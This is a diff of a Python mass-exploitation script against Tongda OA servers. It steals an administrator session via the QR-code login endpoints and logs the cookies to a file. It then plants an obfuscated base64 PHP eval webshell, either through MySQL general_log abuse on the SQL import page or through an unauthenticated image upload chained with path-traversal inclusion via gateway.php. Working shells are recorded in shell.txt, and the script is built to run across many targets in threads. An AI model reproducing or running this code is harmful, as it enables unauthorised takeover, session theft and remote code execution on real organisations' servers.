@@ -1,9 +1,12 @@
+import time
 import json
 import base64
+import hashlib
 import urllib3
 import requests
 import functools
 import threadpool
+from lxml import etree
 
 urllib3.disable_warnings()
 headers = {
@@ -21,6 +24,14 @@ def modified_session():
     return s
 
 
+def check_flag(flag = ""):
+    if flag:
+        return hashlib.md5(flag.encode("utf-8")).hexdigest()
+    else:
+        now = str(time.time())
+        return hashlib.md5(now.encode("utf-8")).hexdigest()
+
+
 def wirte_targets(vurl, filename):
     with open(filename, "a+") as f:
         f.write(vurl + "\n")
@@ -28,7 +39,6 @@ def wirte_targets(vurl, filename):
 
 
 def get_cookie(url):
-
     session = modified_session()
     try:
         r1 = session.get(url + "/ispirit/login_code.php")
@@ -40,7 +50,7 @@ def get_cookie(url):
             if r1.status_code == 200 and status != -1:
                 codeUid = json.loads(r1.text[status:])["code_uid"]
             else:
-                return
+                return False
         data = {"codeuid": codeUid, "uid": int(1), "source": "pc", "type": "confirm", "username": "admin"}
         r2 = session.post(url + "/general/login_code_scan.php", data=data)
         if r2.status_code == 200 and json.loads(r2.text)["status"] == "1":
@@ -49,53 +59,118 @@ def get_cookie(url):
                 return r3.headers["Set-Cookie"]
     except:
         pass
-    return
+    return False
 
+
+def get_info(url, cookieDict):
+    session = modified_session()
+    requests.utils.add_dict_to_cookiejar(session.cookies, cookieDict)
+    try:
+        r1 = session.get(url + "/general/system/security/service.php")
+        if r1.status_code == 200 and "Webroot" in r1.text:
+            html1 = etree.HTML(r1.text)
+            webRoot = html1.xpath('//input[@name="WEBROOT"]/@value')[0].replace("\\", "/")
+            # attachPath = html1.xpath('//input[@name="DEFAULT_ATTACH_PATH"]/@value')[0].replace("\\", "/")
+            # r2 = session.get(url + "/general/system/reg_view/index.php")
+            # html2 = etree.HTML(r2.text)
+            # infoList = html2.xpath('//td[contains(@class,"") or contains(@class,"TableContent")]//text()')
+            # dataVer = infoList[infoList.index("\xa0数据库数据版本号：")+1].strip()
+            # dataVer = float(dataVer.rsplit(".", 1)[0])
+            # if int(dataVer) == 11:
+            #     tongdaVer = dataVer
+            # elif int(dataVer) == 10:
+            #     tongdaVer = 2017
+            # elif int(dataVer) == 9:
+            #     tongdaVer = 2016
+            # elif int(dataVer) == 8:
+            #     tongdaVer = 2015
+            # elif int(dataVer) == 6 or 7:
+            #     tongdaVer = 2013
+            # else:
+            #     tongdaVer = 0
+            # return {"webRoot": webRoot, "attachPath": attachPath, "tongdaVer": tongdaVer}
+            return {"webRoot": webRoot}
+    except:
+        return False
+
+
+def mysql_log_getshell(url, cookieDict, webRoot, contents):
+    flag = check_flag()
+    tempName = flag + ".php"
+    logPath = webRoot.rsplit("/", 1)[0] + "/data5/WIN-J1S8L919HTC.log"
+    contents = contents + '<?php unlink(__FILE__);unlink("' + logPath + '");echo "' + flag + '";?>'
+    sql = "set global general_log='on';SET global general_log_file='%s/%s';SELECT '%s';SET global general_log_file='%s';SET global general_log='off';" % (webRoot, tempName, contents, logPath)
+    files = {"sql_file": ("123.sql", sql, "application/octet-stream")}
+    session = modified_session()
+    try:
+        r1 = session.post(url + "/general/system/database/sql.php", cookies=cookieDict, files=files, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"})
+        if r1.status_code == 200 and "数据库脚本导入完成！" in r1.text:
+            r2 = session.get(url + "/" + tempName)
+            if r2.status_code == 200 and flag in r2.text:
+                return True
+    except:
+        pass
+    return False
+
+
+def unauth_upload_shell(url, cookieDict, contents):
+    flag = check_flag()
+    contents = contents + '<?php echo "' + flag + '";?>'
+    data1 = {"UPLOAD_MODE": "1", "P": cookieDict["PHPSESSID"], "DEST_UID": "1"}
+    files = {"ATTACHMENT": ("jpg", contents, "image/jpeg")}
+    session = modified_session()
+    requests.utils.add_dict_to_cookiejar(session.cookies, cookieDict)
+    try:
+        r1 = session.post(url + "/ispirit/im/upload.php", data=data1, files=files, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"})
+        text = r1.text
+        if r1.status_code == 200 and "[vm]" in text:
+            uploadFilePath = text[text.find("@")+1:text.find("|")].replace("_", "/")
+            data2 = 'json={"url":"/general/../../attach/im/%s.jpg"}' % uploadFilePath
+            r2 = session.post(url + "/mac/gateway.php", data=data2)
+            if r2.status_code == 404 or flag not in r2.text:
+                r2 = session.post(url + "/ispirit/interface/gateway.php", data=data2)
+            if r2.status_code == 200 and flag in r2.text:
+                return True
+    except:
+        pass
+    return False
+    
 
 def exp(url):
     shellName = "templates.php"
     tongdaDir = "/"
-    uploadFlag = "upload jpg shell"
-    shellFlag = "sucess !!"
-
-    b64Shell = "PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJhIl07ZXZhbCgiIi4kYik7ZWNobyAi" + base64.b64encode(shellFlag.encode("utf-8")).decode("utf-8") + "Ijs/Pg=="
+    shellFlag = check_flag()
     # password:a
     # POST method
-    # base64.decode: <?php $a="~+d()"^"!{+{}";$b=${$a}["a"];eval("".$b);echo "sucess !!";?>
+    # base64.decode: <?php $a="~+d()"^"!{+{}";$b=${$a}["a"];eval("".$b);?>
+    b64Shell = "PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJhIl07ZXZhbCgiIi4kYik7Pz4="
 
+    writeShell = '<?php file_put_contents($_SERVER["DOCUMENT_ROOT"]."/%s",base64_decode("%s")."%s");?>' % (tongdaDir + shellName, b64Shell, shellFlag)
     printFlag = ""
-    cookieDict = {"PHPSESSID": "no_cookie"}
+    sucess = False
     cookie = get_cookie(url)
-    # if get cookie failed, then try to upload shell without authentication. For more details: https://github.com/jas502n/oa-tongda-rce
-    if cookie:         
-        cookieDict = dict([l.split("=", 1) for l in cookie.split("; ")])
+    cookieDict = {"PHPSESSID": "no_cookie"}
+    if cookie:
         loginCookie = "%s/general/index.php\t%s" % (url, cookie)
-        printFlag = "[Login]：" + loginCookie + "\n"
+        printFlag = "[Login]：%s\n" % loginCookie
         wirte_targets(loginCookie, "cookie.txt")
-    session = modified_session()
-    requests.utils.add_dict_to_cookiejar(session.cookies, cookieDict)
-    UploadData = {"UPLOAD_MODE": "1", "P": cookieDict["PHPSESSID"], "DEST_UID": "1"}
-    uploadShellContents = "<?php\r\nfile_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"/%s\", base64_decode('%s'));\r\necho \"%s\";\r\n?>" % (tongdaDir + shellName, b64Shell, uploadFlag)
-    files = {"ATTACHMENT": ("jpg", uploadShellContents, "image/jpeg")}
-    try:
-        r1 = session.post(url + "/ispirit/im/upload.php", data=UploadData, files=files, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"})
-        text = r1.text
-        if r1.status_code == 200 and "[vm]" in text:
-            uploadFilePath = text[text.find('@')+1:text.find('|')].replace('_', '/')
-            # need more tests here
-            includeData = 'json={"url":"/general/../../attach/im/' + uploadFilePath + '.jpg"}'
-            r2 = session.post(url + "/mac/gateway.php", data=includeData)
-            if r2.status_code == 404 or uploadFlag not in r2.text:
-                r2 = session.post(url + "/ispirit/interface/gateway.php", data=includeData)
-            if r2.status_code == 200 and uploadFlag in r2.text:
-                shellPath = url + tongdaDir + shellName
-                r3 = session.get(shellPath)
-                if shellFlag in r3.text:
-                    printFlag = "[Getshell]：%s\t%s\n" % (shellPath, cookie)
-                    wirte_targets(shellPath, "shell.txt")
-    except:
-        pass
-    print(printFlag, end='')
+        cookieDict = dict([l.split("=", 1) for l in cookie.split(";")])
+        info = get_info(url, cookieDict)
+        if info:
+            sucess = mysql_log_getshell(url, cookieDict, info["webRoot"], writeShell)
+    if sucess == False:
+        sucess = unauth_upload_shell(url, cookieDict, writeShell)
+    if sucess:
+        session = modified_session()
+        shellPath = url + tongdaDir + shellName
+        try:
+            r3 = session.get(shellPath)
+            if r3.status_code == 200 and shellFlag in r3.text:
+                printFlag = "[Getshell]：%s\t%s\n" % (shellPath, cookie)
+                wirte_targets(shellPath, "shell.txt")
+        except:
+            pass
+    print(printFlag, end="")
 
 
 def multithreading(funcname, params, filename, pools):
